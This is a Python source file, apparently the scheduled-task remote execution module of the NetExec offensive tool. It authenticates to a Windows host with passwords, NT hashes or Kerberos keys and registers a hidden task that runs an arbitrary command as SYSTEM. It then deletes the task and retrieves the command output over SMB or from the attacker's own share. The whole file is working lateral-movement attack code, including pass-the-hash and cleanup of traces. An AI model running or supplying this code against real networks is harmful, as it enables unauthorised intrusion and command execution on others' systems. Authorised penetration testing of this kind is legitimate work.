import os
from impacket.dcerpc.v5 import tsch, transport
from impacket.dcerpc.v5.dtypes import NULL
from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_GSS_NEGOTIATE, RPC_C_AUTHN_LEVEL_PKT_PRIVACY
from nxc.helpers.misc import gen_random_string
from time import sleep
from datetime import datetime, timedelta


class TSCH_EXEC:
    def __init__(self, target, share_name, username, password, domain, doKerberos=False, aesKey=None, remoteHost=None, kdcHost=None, hashes=None, logger=None, tries=None, share=None):
        self.__target = target
        self.__username = username
        self.__password = password
        self.__domain = domain
        self.__share_name = share_name
        self.__lmhash = ""
        self.__nthash = ""
        self.__outputBuffer = b""
        self.__retOutput = False
        self.__aesKey = aesKey
        self.__doKerberos = doKerberos
        self.__remoteHost = remoteHost
        self.__kdcHost = kdcHost
        self.__tries = tries
        self.__output_filename = None
        self.__share = share
        self.logger = logger

        if hashes is not None:
            # This checks to see if we didn't provide the LM Hash
            if hashes.find(":") != -1:
                self.__lmhash, self.__nthash = hashes.split(":")
            else:
                self.__nthash = hashes

        if self.__password is None:
            self.__password = ""

        stringbinding = r"ncacn_np:%s[\pipe\atsvc]" % self.__target
        self.__rpctransport = transport.DCERPCTransportFactory(stringbinding)
        self.__rpctransport.setRemoteHost(self.__remoteHost)

        if hasattr(self.__rpctransport, "set_credentials"):
            # This method exists only for selected protocol sequences.
            self.__rpctransport.set_credentials(
                self.__username,
                self.__password,
                self.__domain,
                self.__lmhash,
                self.__nthash,
                self.__aesKey,
            )
            self.__rpctransport.set_kerberos(self.__doKerberos, self.__kdcHost)

    def execute(self, command, output=False):
        self.__retOutput = output
        self.execute_handler(command)
        return self.__outputBuffer

    def output_callback(self, data):
        self.__outputBuffer = data

    def get_end_boundary(self):
        # Get current date and time + 5 minutes
        end_boundary = datetime.now() + timedelta(minutes=5)

        # Format it to match the format in the XML: "YYYY-MM-DDTHH:MM:SS.ssssss"
        return end_boundary.strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3]

    def gen_xml(self, command, fileless=False):
        xml = f"""<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Triggers>
    <RegistrationTrigger>
      <EndBoundary>{self.get_end_boundary()}</EndBoundary>
    </RegistrationTrigger>
  </Triggers>
  <Principals>
    <Principal id="LocalSystem">
      <UserId>S-1-5-18</UserId>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>true</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>P3D</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context="LocalSystem">
    <Exec>
      <Command>cmd.exe</Command>
"""
        if self.__retOutput:
            self.__output_filename = "\\Windows\\Temp\\" + gen_random_string(6)
            if fileless:
                local_ip = self.__rpctransport.get_socket().getsockname()[0]
                argument_xml = f"      <Arguments>/C {command} &gt; \\\\{local_ip}\\{self.__share_name}\\{self.__output_filename} 2&gt;&amp;1</Arguments>"
            else:
                argument_xml = f"      <Arguments>/C {command} &gt; {self.__output_filename} 2&gt;&amp;1</Arguments>"

        elif self.__retOutput is False:
            argument_xml = f"      <Arguments>/C {command}</Arguments>"

        self.logger.debug("Generated argument XML: " + argument_xml)
        xml += argument_xml

        xml += """
    </Exec>
  </Actions>
</Task>
"""
        return xml

    def execute_handler(self, command, fileless=False):
        dce = self.__rpctransport.get_dce_rpc()
        if self.__doKerberos:
            dce.set_auth_type(RPC_C_AUTHN_GSS_NEGOTIATE)

        dce.set_credentials(*self.__rpctransport.get_credentials())
        dce.connect()

        tmpName = gen_random_string(8)

        xml = self.gen_xml(command, fileless)

        self.logger.debug(f"Task XML: {xml}")
        self.logger.info(f"Creating task \\{tmpName}")
        try:
            # windows server 2003 has no MSRPC_UUID_TSCHS, if it bind, it will return abstract_syntax_not_supported
            dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
            dce.bind(tsch.MSRPC_UUID_TSCHS)
            tsch.hSchRpcRegisterTask(dce, f"\\{tmpName}", xml, tsch.TASK_CREATE, NULL, tsch.TASK_LOGON_NONE)
        except Exception as e:
            if e.error_code and hex(e.error_code) == "0x80070005":
                self.logger.fail("ATEXEC: Create schedule task got blocked.")
            else:
                self.logger.fail(str(e))
            return

        done = False
        while not done:
            self.logger.debug(f"Calling SchRpcGetLastRunInfo for \\{tmpName}")
            resp = tsch.hSchRpcGetLastRunInfo(dce, f"\\{tmpName}")
            if resp["pLastRuntime"]["wYear"] != 0:
                done = True
            else:
                sleep(2)

        self.logger.info(f"Deleting task \\{tmpName}")
        tsch.hSchRpcDelete(dce, f"\\{tmpName}")

        if self.__retOutput:
            if fileless:
                while True:
                    try:
                        with open(os.path.join("/tmp", "nxc_hosted", self.__output_filename)) as output:
                            self.output_callback(output.read())
                        break
                    except OSError:
                        sleep(2)
            else:
                ":".join(map(str, self.__rpctransport.get_socket().getpeername()))
                smbConnection = self.__rpctransport.get_smb_connection()

                tries = 0
                # Give the command a bit of time to execute before we try to read the output, 0.4 seconds was good in testing
                sleep(0.4)
                while True:
                    try:
                        self.logger.info(f"Attempting to read {self.__share}\\{self.__output_filename}")
                        smbConnection.getFile(self.__share, self.__output_filename, self.output_callback)
                        break
                    except Exception as e:
                        if tries > self.__tries:
                            self.logger.fail("ATEXEC: Could not retrieve output file, it may have been detected by AV. Please increase the number of tries with the option '--get-output-tries'. If it is still failing, try the 'wmi' protocol or another exec method")
                            break
                        if "STATUS_BAD_NETWORK_NAME" in str(e):
                            self.logger.fail(f"ATEXEC: Getting the output file failed - target has blocked access to the share: {self.__share} (but the command may have executed!)")
                            break
                        elif "STATUS_VIRUS_INFECTED" in str(e):
                            self.logger.fail("Command did not run because a virus was detected")
                            break
                        # When executing powershell and the command is still running, we get a sharing violation
                        # We can use that information to wait longer than if the file is not found (probably av or something)
                        if "STATUS_SHARING_VIOLATION" in str(e):
                            self.logger.info(f"File {self.__share}\\{self.__output_filename} is still in use with {self.__tries - tries} left, retrying...")
                            tries += 1
                            sleep(1)
                        elif "STATUS_OBJECT_NAME_NOT_FOUND" in str(e):
                            self.logger.info(f"File {self.__share}\\{self.__output_filename} not found with {self.__tries - tries} left, deducting 10 tries and retrying...")
                            tries += 10
                            sleep(1)
                        else:
                            self.logger.debug(str(e))

                if self.__outputBuffer:
                    self.logger.debug(f"Deleting file {self.__share}\\{self.__output_filename}")
                    smbConnection.deleteFile(self.__share, self.__output_filename)

        dce.disconnect()
